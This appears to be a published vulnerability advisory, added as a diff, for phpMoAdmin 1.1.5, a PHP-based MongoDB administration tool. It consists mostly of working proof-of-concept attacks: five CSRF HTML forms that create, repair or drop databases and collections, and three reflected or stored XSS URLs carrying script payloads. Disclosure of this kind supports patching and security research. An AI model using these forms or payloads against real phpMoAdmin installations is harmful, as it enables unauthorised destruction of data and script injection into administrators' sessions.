@@ -1,0 +1,157 @@
+##################################################################################################################################
+# Exploit Title: phpMoAdmin 1.1.5 - MongoDB GUI | Multiple Vulnerabilities
+# Date: 03.01.2019
+# Exploit Author: Ozer Goker
+# Vendor Homepage: http://www.phpmoadmin.com
+# Software Link: http://www.phpmoadmin.com/file/phpmoadmin.zip
+# Version: 1.1.5
+##################################################################################################################################
+
+Introduction
+
+phpMoAdmin - MongoDB GUI
+MongoDB administration tool for PHP
+
+Vulnerabilities: CSRF | XSS Reflected & Stored
+
+CSRF details:
+
+#################################################################################
+
+CSRF1
+
+Create Database
+
+
+<html>
+<body>
+<form action="http://localhost/phpmoadmin/moadmin.php" method="GET">
+<input type="text" name="db" value="new.database"/>
+<input type="text" name="newdb" value="testdb"/>
+<input type="submit" value="Create DB"/>
+</form>
+</body>
+</html>
+
+
+#################################################################################
+
+CSRF2
+
+Drop Database
+
+<html>
+<body>
+<form action="http://localhost/phpmoadmin/moadmin.php" method="GET">
+<input type="text" name="action" value="dropDb"/>
+<input type="text" name="db" value="testdb"/>
+<input type="submit" value="Drop DB"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF3
+
+Repair Database
+
+<html>
+<body>
+<form action="http://localhost/phpmoadmin/moadmin.php" method="GET">
+<input type="text" name="action" value="repairDb"/>
+<input type="text" name="db" value="testdb"/>
+<input type="submit" value="Repair DB"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF4
+
+Add New Collection
+
+<html>
+<body>
+<form action="http://localhost/phpmoadmin/moadmin.php" method="GET">
+<input type="text" name="action" value="createCollection"/>
+<input type="text" name="db" value="testdb"/>
+<input type="text" name="collection" value="testcollection"/>
+<input type="submit" value="Create Collection"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF5
+
+Drop Collection
+
+<html>
+<body>
+<form action="http://localhost/phpmoadmin/moadmin.php" method="GET">
+<input type="text" name="action" value="dropCollection"/>
+<input type="text" name="db" value="testdb"/>
+<input type="text" name="collection" value="testcollection"/>
+<input type="submit" value="Drop Collection"/>
+</form>
+</body>
+</html>
+
+
+#################################################################################
+
+
+XSS details:
+
+#################################################################################
+
+XSS1 | Reflected
+
+URL
+http://localhost/phpmoadmin/moadmin.php?db=admin%3Cscript%3Ealert(1)%3C/script%3E
+
+METHOD
+Get
+
+PARAMETER
+db
+
+PAYLOAD
+<script>alert(1)</script>
+
+#################################################################################
+
+XSS2 | Reflected
+
+URL
+http://localhost/phpmoadmin/moadmin.php?db=new.database&newdb=testdb%3Cscript%3Ealert(2)%3C/script%3E
+
+METHOD
+Get
+
+PARAMETER
+newdb
+
+PAYLOAD
+<script>alert(2)</script>
+
+#################################################################################
+
+XSS3 | Stored
+URL
+http://localhost/phpmoadmin/moadmin.php?collection=%3Cscript%3Ealert%283%29%3C%2Fscript%3E&action=createCollection&db=testdb
+
+METHOD
+Get
+
+PARAMETER
+collection
+
+PAYLOAD
+<script>alert(3)</script>
+
+
+#################################################################################
